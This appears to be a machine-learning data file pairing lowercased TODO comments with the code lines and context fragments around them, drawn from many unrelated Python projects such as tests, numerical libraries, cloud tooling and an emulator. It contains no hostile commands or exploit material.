# todo fix. </s> self.assertequals(reil_ctx_out["mm0"], res)	test_movd_1 res = 0x0000000087654321 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["rax"], ctx_init["rax"])
feature_dim,  # todo define proper size </s> "a",	combine_sparse_dense_features train_utils.tf_dense_layer( batch[key_sparse], self.C2, feature_dim=feature_dim,
# todo how to get number of cells from mesh? </s> a = nm.zeros((len(self.mesh.coors), len(self.mesh.coors)), dtype=nm.float64)	assemble def assemble(self): for term in self.terms: val, iels = term.evaluate()
#todo: make service manager configurable </s> get_service_manager().register(self.resolved_name, self)	__init__ self.protocol = TCPService(self.resolved_name, service_class, self.buff_size) logdebug("[%s]: new Service instance"%self.resolved_name)
# todo: currently this test breaks the bleu implementation (13.03.2016) </s> references = ['john loves mary'.split()]	test_case_where_n_is_bigger_than_hypothesis_length def test_case_where_n_is_bigger_than_hypothesis_length(self): hypothesis = 'John loves Mary'.split() n = len(hypothesis) + 1 #
# @todo: enclosures </s> )	poll_rss location_id = location_id, tags = tags, else: id = minsert(channel_id = channel_id,
# todo: discriminate between worksheet & workbook ranged names </s> self.rangednames = np.zeros(shape = (int(self.app.activeworkbook.names.count),1), dtype=[('id', 'int_'), ('name', 's200'), ('formula', 's200')])	__init__ self.filename = path.abspath(filename) self.app = app for i in range(0, self.app.ActiveWorkbook.Names.Count): self.rangednames[i]['id'] = int(i+1)
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
pass # todo </s> def handle_request(self, input):	handle_request
# todo: may use sys.stdout.encoding if output_file = '-' </s> output_encoding = output_encoding or sys.stdout.encoding or \	query table_name='table{}'.format(index)) result = rows.import_from_sqlite(sqlite_connection, query=query) DEFAULT_OUTPUT_ENCODING if output is None:
# todo: handle situations where share is password protected </s> pathname = string.replace(pathname,'/', '\\')	rmdir def rmdir(self, shareName, pathName, password = None): pathName = ntpath.normpath(pathName) if len(pathName) > 0 and pathName[0] == '\\':
# todo: find a better way to handle indentation? </s> new_message = []	execute message = sqlparse.format(sql, reindent=True, keyword_case='upper') first = False for line in message.split('\n'): if first:
# todo: output_path is an integer, who knows why? </s> del keyfile_descriptor	_save_private_keyfile keyfile.write(json.dumps(key_data)) output_path = keyfile.name return output_path
# todo look at media_item_json_status["status"] for individual errors </s> media_item_json = media_item_json_status["mediaitem"]	download_photo_media for media_item_json_status in r_json["mediaItemResults"]: count += 1 media_item = GooglePhotosMedia(media_item_json) media_item.set_path_by_date(self._media_folder)
# todo: parallelize this </s> for user in users:	IAMFacade client = AWSFacadeUtils.get_client('iam', self.session) users = await AWSFacadeUtils.get_all_pages('iam', None, self.session, 'list_users', 'Users') user_name = user['UserName'] user_id = user['UserId']
logfile = open(os.path.join(self.config.logdir, 'exceptions.log'), 'a') #todo: make not hardcoded </s> logfile.write('fatal error in core, handle_error() was called')	handle_error pass self.debug("core", 'Fatal error in core, please review exception log', 'always') logfile.write('last raw line was %s' % self.raw) logfile.write(trace)
# todo clean up how this is passed around? </s> return self.insecure_conn.initiator	initiator def initiator(self) -> bool:
pass  # todo - should this do something </s> press "leave domain" on users tab	on_btleavedomain_clicked def on_btleavedomain_clicked(self, widget, data=None):
# todo check initial residual with original weights </s> r0 = f(x0)	_optimize_weights_as_variables splits = numpy.cumsum(sizes)[:-1] x0 = numpy.concatenate([numpy.array(val).flat for val in values]) out = minimize(f, x0, method="Nelder-Mead", tol=1.0e-17)
## todo: check if idle is supported </s> return connection	_connection_starttls connection = imaplib.IMAP4(self.server, self.port) connection.starttls(create_default_context())
# todo: check how to be writeable only from same group </s> print("check how to be writeable only from same group")	__init__ gid = getgrnam(JtopServer.PIPE_JTOP_USER).gr_gid except KeyError: gid = os.getgid() if os.path.exists(JtopServer.PIPE_JTOP_CTRL):
except exception:  # todo: refactor this... </s> e = sys.exc_info()[0]	test_PUT_InvalidURL try: self.assertEqual(self.rnw.PUT(url, data), 'json') self.assertEquals(e, TypeError)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: add a parameter to condition the derivative being returned </s> if (x < self.xmin).any() or (x > self.xmax).any():	PI self.xmax = xmax def __call__(self, X, Z=None, **kwargs): u = 0 du = np.zeros((X.shape[1],1))
# todo(mcgallaspy): get rid of old integration tests and refactor the mixin methods </s> class contextwithmixin(createadminmixin):	login_as_admin :admin_pass: optional. password of the admin. if not User.objects.filter(username=admin_name): def __init__(self): self.browser = context.browser
# @todo do not generate __complete if type has no url attribute </s> self.__complete()	__completeIfNeeded if not self.__completed and testedAttribute is None:
# todo: handle cancellation robustly </s> mpf._prec += 20	tan if isinstance(x, mpf): return _make_mpf(ftan(x.val, mpf._prec, mpf._rounding)) t = sin(x) / cos(x) mpf._prec -= 20
# todo: test with_polls! </s> user_comments = comment.objects\	comments def comments(request, pk, slug): .filter(user_id=pk)\ .visible()\
# todo tell it to some human operator </s> pass	update f.write(json.dumps(self._store[key].dump())) except IOError:
# todo: add only public info </s> update_feed(obj)	add_blog_event obj['name'] = r.name obj['short_name'] = r.short_name mail_queue.enqueue(notify_blog_users, blog_id=target.id,
pass  # todo: replace this </s> try:	__eq__ this = eval(f'self.{attribute}') except Exception as exc_this: that = eval(f'other.{attribute}') except Exception as exc_that:
# todo allow (1, none) and set to identity matrix if k == 1 </s> k_param = iap.handle_discrete_param(	__init__ def __init__(self, k=5, angle=(0, 360), direction=(-1.0, 1.0), order=1, name=None, deterministic=False, random_state=None): k, "k", value_range=(3, None), tuple_to_uniform=True, list_to_choice=True, allow_floats=False)
# todo: put this into timeframegroup. #316 </s> for timeframe in timeframes:	split_timeframes def split_timeframes(timeframes, duration_threshold): for split in timeframe.split(duration_threshold): yield split
# todo implement </s> flag = 0x00020000.to_bytes(4, byteorder="little")	hook_GetVolumeInformationW pt_flag = params["lpFileSystemFlags"] if pt_flag != 0: ql.uc.mem_write(pt_flag, flag) if pt_system_type != 0:
"""todo: fixed code to test passed """ </s> code = 'def a_func():\n    for i in range(10):\n        a=i\n    else:\n        a=none\n'	test_extract_function_with_for_else_statemant def test_extract_function_with_for_else_statemant(self): start = code.index('for') end = len(code) - 1
# todo make test_var `nonlocal` once we drop py2 -- it can just be a </s> test_var[dict_key] += 1	test_callback test_var = {"foo": 0} def set_global(dict_key, old_value, new_value): class MyConfig(_ConfigBase): foo = _ConfigValue("foo", callbacks=[set_global])
# todo: support minp arg end_range etc. </s> minp = win	roll_fixed_apply n_pes = hpat.distributed_api.get_size() N = len(in_arr) offset = (win - 1) // 2 if center else 0 if parallel:
# todo: test me. </s> @motion.setter	motion def motion(self, name): self.settings.vi['motion'] = MOTION_TRANSLATION_TABLE.get((self.action, name), name)
#todo (this should be done even when add_trust hasn't been </s> n.attr['color'] = colors['non_existent']	add_trust status = Status.RRSET_STATUS_BOGUS elif 'dashed' in style: status = Status.RRSET_STATUS_NON_EXISTENT else:
# todo: think of better way doing this. </s> if isinstance(sample, (list, tuple)):	_get_queryset def _get_queryset(sample): return lambda func: func elif isinstance(sample, Model):
#todo: rally_land points </s> mpstate.console.writeln("lat=%f lng=%f alt=%f break_alt=%f land_dir=%f" % (p.lat * 1e-7, p.lng * 1e-7, p.alt / 100.0, p.break_alt / 100.0, p.land_dir / 100.0))	list_rally_points p = mpstate.status.rallyloader.rally_point(i)
# todo(sfinucan): remove this warning when the named config options </s> if conf.trusted_computing.attestation_auth_timeout < 0:	ComputeAttestationCache host = compute.hypervisor_hostname self._init_cache_entry(host) LOG.warning(_LW('Future versions of nova will restrict the ' '"trusted_computing.attestation_auth_timeout" config option '
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: should this test support cff as well? </s> if 'cff ' in font: self.skip("no 'glyf' table to check in a cff font.")	test_check_glyf_table_length def test_check_glyf_table_length(self): font = Font.get_ttfont(self.operator.path) expected = font.get_loca_length() actual = font.get_glyf_length()
# todo: for backward compatibility only, remove if not used anymore </s> def get_project_id(self):	get_project_id return get_project(key='id')
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	init_host def init_host(self, host):
# todo: truffle revertme once doctest is supported (once io can read text files) (gr-9151) </s> suite = unittest.testsuite()	test_main def test_main(): suite.addTest(unittest.makeSuite(MathTests)) suite.addTest(unittest.makeSuite(IsCloseTests))
# todo: add kwargs in command </s> cmd, self, args = command	handle_method_command self of the method, arguments[, kwargs]) :return: the response of the method command print("Logtensor logging method", cmd) new_self, new_args = syft.frameworks.torch.hook_args.hook_method_args(cmd, self, args)
# todo(qos): figure out why it passes locally but fails in gate </s> self.skiptest("gate is voodoo failing")	test_create_network_rpc_outside_transaction def test_create_network_rpc_outside_transaction(self): with mock.patch.object(ml2_plugin.Ml2Plugin, '__init__') as init,\ mock.patch.object(base_plugin.NeutronDbPluginV2,
if event.keysym in ("control_l", "control_r", "command"):  # todo: check in mac </s> self.text.tag_configure("value", foreground="darkblue", underline=0)	_text_key_release def _text_key_release(self, event):
# todo: timeline is global, get rid of it </s> deps_dict = copy(kw)	gen_task flag = False for lang in kw["translations"]: deps_dict.pop('timeline') for post in kw['timeline']:
# todo(b/142684737): the multi-processing api might change. </s> beam_pipeline_args=['--direct_num_workers=%d' % direct_num_workers])	_create_pipeline metadata_connection_config=metadata.sqlite_metadata_connection_config( metadata_path),
# todo: drape topography? </s> m = np.c_[mx, np.zeros_like(mx)]	genDCSurvey_2D Mx = self.RxLoc[self.RxID[self.SrcID == iSrc], 0] Ax = self.SrcLoc[iSrc, 0] if problemType == "2.5D": rx = DC.Rx.Pole_ky(M)
# todo(user): remove version when we update aws-cli </s> vm.remotecommand('sudo pip3 install --ignore-installed "pyyaml<5.4"')	PrepareVM vm.RemoteCommand('sudo pip3 install --upgrade "pip<=20.2.2"') vm.RemoteCommand('sudo pip3 install absl-py') vm.Install('openssl') vm.RemoteCommand('sudo mkdir -p ' + SCRIPT_DIR)
# todo: verify these values and formula </s> coeff = blockheader.calc_coeff(21000000, 420480000)	remaining_emission >>> BlockHeader.remaining_emission(1, 1) Decimal('0.99999996') return decimal.Decimal(N_tot * decimal.Decimal(-coeff * block_n).exp()) \ .quantize(decimal.Decimal('1.00000000'), rounding=decimal.ROUND_HALF_UP)
session.add(job)  # todo review this after remapping job (required to lazy-load attr) </s> obj.job = job	TestImplicitCollectionJobsJobAssociation obj = cls_() obj.implicit_collection_jobs = implicit_collection_jobs obj.order_index = 1 with dbcleanup(session, obj) as obj_id:
# todo remove after pytorch 1.0 </s> with warnings.catch_warnings():	wrap_batch volatile=volatile)) elif pyu.is_listlike(_batch): warnings.simplefilter('ignore') variable_batch.append([Variable(__batch, requires_grad=requires_grad,
# todo: download bwta </s> if not args.headless:	main if "sscai" in args.map and not exists(f"{args.map_dir}/sscai"): download_sscait_maps(args.map_dir) check_vnc_exists() if args.human and args.headless:
# todo: do we change this to something like "threshold" </s> m, n = int(request.args['m']), int(request.args['n'])	create_policy bob_pubkey = bytes.fromhex(request.args['bob_encrypting_key']) label = bytes.fromhex(request.args['label']) payment_details = request.args['payment'] federated_only = True # const for now
# todo: there's still some code duplication with static method gitrepo.get_git_dir() </s> if self.dot_git.is_file():	__init__ self.pathobj = ut.Path(self.path) self.dot_git = self.pathobj / '.git' with self.dot_git.open() as f: line = f.readline()
#todo - these are not currently implemented as properties, this means </s> if attr == 'start':	__getattr__ case here sucks, but there is really not a general rule you can apply to this. return self._start elif attr == 'end':
# todo: this test requires manifold access, see: t88318502 </s> self._test_model("coco-instancesegmentation/mask_rcnn_r_50_fpn_3x.yaml")	testMaskRCNN def testMaskRCNN(self):
# todo log here </s> return none	get_user_id ) except httplib.HTTPException: if response.status_code != 200: return None
# todo (#567): bucket the node as suspicious </s> return response(message, status=httpstatus.payment_required)	reencrypt message = f"{bob_identity_message} Policy {hrac} is unpaid." record = (publisher_verifying_key, message) except Policy.Unknown: message = f"{bob_identity_message} Policy {hrac} is not a published policy."
# todo(vek): fails until remove_fixed_ip() added </s> self.context = context.get_admin_context()	setUp self.stubs.Set(compute.api.API, "add_fixed_ip", compute_api_add_fixed_ip)
# todo: re-enable </s> payload['load'] = load	publish Publish "load" to minions payload = {'enc': 'aes'} if self.opts['sign_pub_messages']: master_pem_path = os.path.join(self.opts['pki_dir'], 'master.pem')
# todo: if input path was http, revert to that and try again. </s> return facts	inspect_download_url "There seems to be a problem with the developer's SSL " "certificate. (%s)" % err) if "Content-Disposition" in raw_download.info(): content_disp = raw_download.info()["Content-Disposition"]
# todo: verify how pandas sorts column names </s> all_colnames = sorted(set(all_colnames))	_handle_concat_df for df in df_list: all_colnames.extend(self._get_df_col_names(df)) gen_nan_func = lambda A: np.full(len(A), np.nan) arg_names = ", ".join(['in{}'.format(i) for i in range(len(df_list))])
# todo(stephenfin): the mock of 'migrate_disk_and_power_off' should </s> with mock.patch(	test_resize_bug_1879878 flavor_b_id = self._create_flavor( vcpu=2, extra_spec={'hw:cpu_policy': 'dedicated'}) 'nova.virt.libvirt.driver.LibvirtDriver' '.migrate_disk_and_power_off', return_value='{}',
# todo implement </s> ret = 1	hook_LCMapStringA }) def hook_LCMapStringA(ql, address, params): return ret
# todo check the actual transformation matrix. </s> print("-----gicp")	testGICP self.assertTrue(converged is True) self.assertLess(fitness, .1) print "Converged: ", converged, "Estimate: ", estimate, "Fitness ", fitness print "Rotation: "
#@todo: remove in 0.4.10 </s> def initperiodical(self):	initPeriodical pass
# @todo: releases </s> return	releases @click.argument('repo', default='') def releases(username):
# todo: remove this block once migration is complete </s> if latest and profile_id and toggles.release_builds_per_profile.enabled(domain):	get_latest_enabled_build latest_enabled_build = get_latest_enabled_app_release(domain, user_location_id, parent_app_id) if not latest_enabled_build: latest_enabled_build = get_latest_enabled_build_for_profile(domain, profile_id) return latest_enabled_build
pass # todo </s> def try_redo(self, *args):	DrHistoryManager pass # TODO def try_redo(self): operation = self._redo_history.pop() if operation['tool_id'] is None:
# todo: reimplement run_config_yaml against user process </s> return none	resolve_run_config_yaml def resolve_run_config_yaml(self, _graphene_info):
# todo it would be nice if we didn't need to copy this or run the </s> res = {	generate_vscode_lldb_script def generate_vscode_lldb_script(root, sysroot, binary_name, port, solib_search_path): "name": "(lldbclient.py) Attach {} (port: {})".format(binary_name.split("/")[-1], port), "type": "lldb",
# todo(leofang): support multi-gpu callback (devices is ignored) </s> if devices:	get_fft_plan plan = cufft.Plan1d(out_size, fft_type, batch, devices=devices) else:  # has_callback raise NotImplementedError('multi-GPU cuFFT callbacks are not ' 'yet supported')
# todo: replace with "yield from" when dropping python 2. </s> for stream in self._parse_live_streams(channel):	_get_live_streams res = ajax(CHINFO_URL, cookies=cookies, data=params) channel = http.json(res, schema=_channel_schema) yield stream
# todo cleanup/merge with above `simple_shell` once we have `subprocess.run` after dropping python 2 support? </s> assert subprocess.check_output(['where', 'python'], env=env, universal_newlines=true).splitlines()[0] == os.path.join(installation_path, 'python.exe')	build simple_shell(['python', '--version'], env=env) simple_shell(['python', '-c', '"import struct; print(struct.calcsize(\'P\') * 8)"'], env=env) if not os.path.exists(os.path.join(installation_path, 'Scripts', 'pip.exe')): simple_shell(['python', get_pip_script], env=env, cwd="C:\\cibw")
# todo: remove after implementing django-constance </s> if not dfirtrack_config.csv_skip_existing_system:	system return redirect(reverse('system_list')) else: messages.warning(request, 'WARNING: Existing systems will be updated!')
assert self.stop_seq is none #todo: better handling of this situation </s> assert self.restart_seq is none #todo: better handling of this situation	restart_program def restart_program(self): assert self.start_seq is None #TODO: Better handling of this situation L.debug("Initializing restart sequence") self.stop_seq = sequence_controller()
# todo: multi dp route resolver needs to flood out stack ports </s> self.host_ping(v100_host, first_faucet_vip.ip)	verify_intervlan_routing self.add_host_route(v100_host, v200_host_ip, first_faucet_vip.ip) self.add_host_route(v200_host, v100_host_ip, second_faucet_vip.ip) self.host_ping(v200_host, second_faucet_vip.ip) self.host_ping(v100_host, v200_host_ip.ip)
# todo(nate): temporarily disabled </s> except exception:	process self.logger.warning('manifest.json had wrong step id (build=%s): expected %s but got %s', self.step.job.build_id.hex, self.step.id.hex, contents['job_step_id']) self.logger.exception('Failed to parse manifest.json; (build=%s, step=%s)', self.step.job.build_id.hex, self.step.id.hex)
# todo - if we want to enable single-direction </s> collision_lines_map.add((top_side_tile, "down"))	loadfile bottom_side_tile = (curr_x, y) curr_x += 1 collision_lines_map.add((bottom_side_tile, "up")) return tiles, collision_map, collision_lines_map, mapsize
# todo: move this to sublime_lib; make it accept a point or a region. </s> def getbol(view, point):	getBOL return view.line(point).begin()
# todo(remove this when 11.6.1 is no longer supported) </s> tmos_v = self._meta_data['bigip']._meta_data['tmos_version']	delete def delete(self, **kwargs): tmos_v = LooseVersion(tmos_v) if tmos_v < LooseVersion('11.6.0'):
# todo: handle temperr case (e.g. dns timeout) </s> if r[0] not in ["pass", "none"]:	handle_reply ) else: LOG.error( "SPF fail for mailbox %s, reason %s, failed IP %s",
# todo: fixed by using realpath, but there should be a cleaner </s> assert_equal(	_test_AnnexDB db.save() db2 = cls(annex=annex) set(db2.get_obsolete()), {opj(realpath(path), p) for p in ['file1.txt', filep2, '2git']})
response=none,  # todo: fix this, make param </s> field_list=nir_field_list, is_offline=false	lookup_rdap nir_data = nir_whois.lookup( nir=nir, inc_raw=inc_raw, retry_count=retry_count, ) results['nir'] = nir_data
# todo: support unicode </s> in_str = unicode_to_std_str(str_arr[i])	_str_replace_regex_impl str_list = hpat.str_ext.alloc_str_list(n) for i in numba.parfor.internal_prange(n): out_str = std_str_to_unicode( hpat.str_ext.str_replace_regex(in_str, e, val))
# todo: in #5022 </s> if menu_item.linked_object:	get_menu_item_as_dict def get_menu_item_as_dict(menu_item): data = {} data["url"] = menu_item.linked_object.get_absolute_url() else:
# todo: align series </s> return geoseries([s[0].difference(s[1]) for s in zip(self, other)],	difference Operates on either a GeoSeries or a Shapely geometry if isinstance(other, GeoSeries): index=self.index) else:
# .. todo :: disconnect done slot/signal </s> except exception, e:	accept self.runner.run()  # Run in same thread QtGui.qApp.restoreOverrideCursor() QtGui.qApp.restoreOverrideCursor() self.hideBusy()
# todo use properties here to infer mechanism and purview from </s> mip = mip(direction=direction,	find_mip if (phi_min - phi) > constants.EPSILON: phi_min = phi mechanism=mechanism, purview=purview,
return  # todo return placeholder "[loading]" track? </s> if sp_track.error != spotify.errortype.ok:	to_track def to_track(sp_track): if not sp_track.is_loaded: return  # TODO Return placeholder "[error]" track? if sp_track.availability != spotify.TrackAvailability.AVAILABLE:
# todo: request whole file from server </s> region = sublime.region(0, view.size())	apply_patch if cur_hash != patch_data['md5']: print "new hash %s != expected %s" % (cur_hash, patch_data['md5']) print "region", region MODIFIED_EVENTS.put(1)
# todo: should be able to change dash, plus and pipe </s> kwargs['encoding'] = encoding	export_to_txt def export_to_txt(table, filename_or_fobj, encoding='utf-8', *args, **kwargs): _, fobj = get_filename_and_fobj(filename_or_fobj, mode='wb') serialized_table = serialize(table, *args, **kwargs)
#todo generate the labels for the dict automatically from labels </s> data = {'time': time_array, 'data': countrate, 'labels': labels}	parse_obssumm_hdulist dim = np.array(countrate[:,0]).size time_array = [reference_time_ut + timedelta(0,time_interval_sec * a) for a in np.arange(dim)] return header, data
# todo consider adding the individual tiles to the resource? </s> for c in tileset_tag:	capture_tileset tileset_tile_height, row_padding=spacing, column_padding=spacing) if c.tag == "image": pass
'lb': [], #todo on apache level config </s> 'staticfiles': [], #['hqproxy0.internal.commcarehq.org'],	realstaging 'remote_es': ['hqdb-staging.internal.commcarehq.org','hqdjango0-staging.internal.commcarehq.org',], 'formsplayer': ['hqdjango1-staging.internal.commcarehq.org'], 'deploy': ['hqdb-staging.internal.commcarehq.org'], #this is a stub becuaue we don't want to be prompted for a host or run deploy too many times 'django_monolith': [] # fab complains if this doesn't exist
# todo: check error location </s> assert result.data == {'nest': none}	test_non_nullable_list_of_nullables assert len(result.errors) == 1 assert result.errors[0].message == 'Cannot return null for non-nullable type.'
#todo: this isn't actually most_recently_used (as defined in histories) </s> if( ( trans.user == none )	get_history_dataset_association_from_ids def get_history_dataset_association_from_ids( self, trans, id, history_id ): and ( history_id == trans.security.encode_id( trans.history.id ) ) ): history = trans.history
# todo make "master" not hard-coded, fetch it from some metadata </s> branchname = default_branch	resetVolume Forcefully roll back the current working copy to this commit. volumePath = self._directory.child(volume) branchPath = volumePath.child("branches").child(branchName) commitPath = volumePath.child("commits").child(commit)
return # todo: determine cause of double-callbacks </s> log.debug("manager's running experiment has failed")	_failed def _failed(self): if not self.is_running(): experiment = self._running_experiment self._clean_up()
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo(rbharath): this will cause an issue with duplicates! </s> closest_nbr_locs = tf.nn.top_k(dists, k=m)[1]	_compute_nbr_list dists = tf.reduce_sum((tiled_coords - nbr_coords)**2, axis=3) dists = tf.reshape(dists, [N, -1]) split_closest_nbr_locs = [ tf.squeeze(locs) for locs in tf.split(closest_nbr_locs, N)
# todo: update the tolerance after the ci moves to torch 1.10 </s> self.asserttrue(torch.allclose(outputs.logits[:, :4], expected_logits, atol=1e-2))	test_inference_diarization self.assertEqual(labels[0, :, 0].sum(), 270) self.assertEqual(labels[0, :, 1].sum(), 647)
# todo(bowen): check </s> return not self.catalog.hasmatch(mol)	check_molecule_pass :return:
raise notimplementederror #todo </s> elif q.kw(i,"request"):	parse raise NotImplementedError #TODO elif q.kw(i,"FORMAT"): raise NotImplementedError #TODO if i != l:
# todo: handle those values correctly </s> return	testValues def testValues(self, clf): if isinstance(clf, MulticlassClassifier): ds = datasets['uni2small'] clf.states._changeTemporarily(enable_states = ['values'])
#    todo: </s> get a link by applying regular expressions	_preParse >>> w = wmlParser( response ) >>> re, parsed = w.getReferences() >>> response = httpResponse( 200, 'header /index.aspx footer', {}, u, u )
# todo: issue an warning </s> pass	InterfacesForm c.call('routes.sync') except Exception:
# todo: if the editor is badly set up, this fails </s> subprocess.popen(editor)	open_cb editor = make_custom_editor_command(path, line) if editor: else: os_open(path, uri)
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo implement. </s> yaml = self.master_model.to_yaml()	_train def _train(self, rdd, nb_epoch, batch_size, verbose, validation_split):
# todo: skips header parsing </s> iline += 1	read_abaqus_inp pass elif word.startswith('material'): line0 = lines[iline].strip().lower() word = line0.strip('*').lower()
return -1 # todo: followup after decision around returning none </s> vollog.log(constants.loglevel_vvv, "cannot access _eprocess.objecttable.handlecount at {0:#x}".format(self.vol.offset))	helper_handle_count except exceptions.PagedInvalidAddressException:
# todo(crcrpar): support botorch v0.4.0. </s> "botorch<0.4.0 ; python_version>'3.6'",	get_extras_require "torchaudio==0.7.2", "allennlp<2.0.0", "fastai", ],
# todo: better check for train_flag. </s> y_ta = none	_get_output_subnet_unit batch_dim = tf.shape(data.placeholder)[data.batch_dim_axis] max_out_len = tf.reduce_max(seq_len) if self.target and self.network.train_flag is not False: y_data = self.network.get_extern_data(self.target, mark_data_key_as_used=True)
# todo: fix this poor naming convention to better support regression tasks. </s> probs = probs.squeeze()	pearson_corr def pearson_corr(gold, _, probs): corr, p_value = pearsonr(gold, probs) return {"pearson_corr": corr}
# todo: make the get_closest_value to return region </s> version, version_index = self.get_closest_value(	get_current_numeric_value r'(\b[0-9]{4}-[0-9]{2}-[0-9]{2}\b)' ) word_like, word_like_index,
# todo: check/show the limits of low and high </s> return none	tune_option_validate return k
# todo: change when multiple envs </s> mean_actions = self.actor_net(latent)	forward state = th.FloatTensor(state).to(self.device) latent = self.shared_net(state) action_std = th.ones(mean_actions.size()) * self.log_std.exp() action_distribution = Normal(mean_actions, action_std)
# make user perm on doctype 'todo' in assignment rule (unrelated doctype) </s> add_user_permissions(get_params(user, "doctype", "todo", applicable=["assignment rule"]))	test_user_perm_on_new_doc_with_user_default }) settings.save() frappe.set_user("user_default_test@example.com") set_session_default_values({"doctype": "ToDo"})
# clone it: (todo: use install here, once it is redone) </s> annexrepo(ds_dir, path, create=true)	test_get_multiple_files origin.add(file_list) origin.save("initial") ds = Dataset(ds_dir) ok_(not any(ds.repo.file_has_content(file_list)))
# todo: check travis build and remove skip when test passed. </s> if ctx.exception.errno == errno.eagain and os.environ.get('travis'):	test_unbind_from_nonbinded_addr with self.assertRaises(OSError) as ctx: tr.unbind('ipc:///some-addr')  # non-bound addr raise unittest.SkipTest("Travis has a bug, it returns " "EAGAIN for unknown endpoint")
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo node_tags? </s> elem_types, elem_tags, _ = gmsh.model.mesh.getelements(dim, e)	generate_mesh cell_sets[name] = [[] for _ in range(len(cells))] for e in gmsh.model.getEntitiesForPhysicalGroup(dim, tag): assert len(elem_types) == len(elem_tags) assert len(elem_types) == 1
# todo stub </s> pass	build_sqlite_in_memory_connection_string def build_sqlite_in_memory_connection_string():
#todo a tester </s> if 'wiz1' in url:	showHosters if aResult: sHosterUrl = aResult[0] oRequestHandler = cRequestHandler(url) sHtmlContent2 = oRequestHandler.request()
# todo will i ever return false? </s> is_head = next((true for branch in branches if sha == branch.commit.sha), none)	check_permissions node_settings.user, node_settings.repo, branch ) else: is_head = True
# todo extend to nonbinary nodes </s> def hamming_matrix(n):	hamming_matrix :math:`N` binary nodes. :param N: The number of nodes under consideration
# todo(luotao): use clone() method to flush the program.desc in force, </s> return program.clone()	transpile self._adjust_input() self._remove_unused_var()
raise exception('not valid monitor')  # todo: custom exception </s> return self.add_monitor(monitor=monitor, name=name)	_add_monitor_from_class monitor = monitor_class(name=name) else:
common_path=prefix,  # todo: add key? </s> action="local",	make_inline_attachments_decision elif rd.op == DiffOp.REMOVE: md = MergeDecision( conflict=True, local_diff=[ld],
#todo _rule_for_states needs to made into a generator </s> self._update_node_observed_status(node)	add_states self._update_rule_for_states(node, len(self.node[node]['_states']))
# todo: consider removing; so many system accounts/groups exist, it's likely to fail </s> else:	_has_expected_windows_permissions elif sid == admins_sid: continue if not (permissions == FULL_CONTROL and ace_type == ACE_TYPE_DENY): return False
# todo: handle timeout </s> if self.__socket is not none:	read @keyword timeout: the maximum time in millisecond to wait before a message can be reached @type timeout: :class:`int` (data, _) = self.__socket.recvfrom(65535) return data
# todo/fixme: check that the shapes are correct! </s> for i in range(len(self.u)):	load def load(self, group): Load the state of the node from a HDF5 file. ui = group['u%d' % i][...] self.u[i] = ui
# todo: a smart way of choosing the number of streams, see #612. </s> if (isinstance(size, (tuple, list)) and	guess_n_streams :param warn: If True, warn when a guess cannot be made (in which case we return 30 * 256). all([isinstance(i, int) for i in size])): r = 1
# todo parse to dataframe </s> req_url = "http://www.google.com/trends/hottrends/atom/feed"	hottrends def hottrends(self): req = self.ses.get(req_url) results = req.text
# todo: errors </s> return	rest_post_connected con = sc.connect_to_service_finish(results) if con == None: post_str = None if self.CSRFtoken == None:
# todo: figure out if both android:name and name tag exist which one to give preference </s> return tag.get(self._ns(attribute)) or tag.get(attribute)	get_value_from_tag :param attribute: specify the attribute :type attribute: string
# todo: how to create a super instance using continuations? </s> vals = field_values + auto_values	constr_proc_cont super_field_values, field_values = split_list(field_values, split_position) something, env, cont = super_type.constructor().call(super_field_values, env, cont) immutable_vals, mutable_vals = [], [] for idx, val in enumerate(vals):
marked[id(atom)] = atom # since marked means "it's been appended to the todo list" </s> while todo:	getConnectedSinglets todo = atomlist # list of atoms we must still mark and explore (recurse on all unmarked neighbors) for atom in todo: newtodo = [] for atom in todo:
# todo: make it really async. </s> self.facade = facade	__init__ self.server_name = server_name
# todo (straya): implement </s> self.log.info("generator received")	WalletNode ): The full node respond with transaction generator @api_request async def reject_generator(
""" todo: documentation </s> return type(self)._retainsevents	retainsevents @property def retainsevents(self):
# todo(shivaniagrawal): rescaling might be expensive for softmax; move </s> wm = self.aqtweight(theta.wm, feature_axis=-1)	_LogitsUsingConcatenatedWeightsHelper p = self.params inputs = self.QTensor('inputs', inputs) wm = self.QWeight(wm) if p.use_bias:
### todo: change to support different metrics. </s> if ((cur_epoch_idx + 1) % self.config.early_stop_epoch) == 0:	train_model loss = self.train_model_epoch(cur_epoch_idx) self.test(cur_epoch_idx) if patience_left > 0 and previous_loss <= loss: patience_left -= 1
# todo: add logging </s> pass	parse_intent def parse_intent(self, token='ri', params='n'):
# todo make sure we can still read an unconstrained successor </s> self._windup_to_unconstrained_successor()	_read_in_global_data_with_read chain_bvv = self.crash.state.BVV(chain.payload_str()) self.crash.state.add_constraints(chain_mem == chain_bvv) glob_data = self.crash.state.memory.load(read_to, len(data)) data_bvv  = self.crash.state.BVV(data)
# todo also test these! </s> continue	test_classifiers_classes continue if Clf in [MultinomialNB, BernoulliNB]: clf = Clf() clf.fit(X, y)
# todo: write </s> raise redisclusterexception("command: {} is blocked in redis cluster mode".format(command))	blocked_command def blocked_command(self, command):
# todo: implement </s> and fails if those commands do not succeed for some reason.	whenProposed commands have been sent to the database to create the L{WorkItem},
# todo(ecastill) create a signature and do a look up </s> pass	_determine_dtype_from_dtype ret_dtype = dtype else: if ret_dtype is None: dtype = args[0].dtype
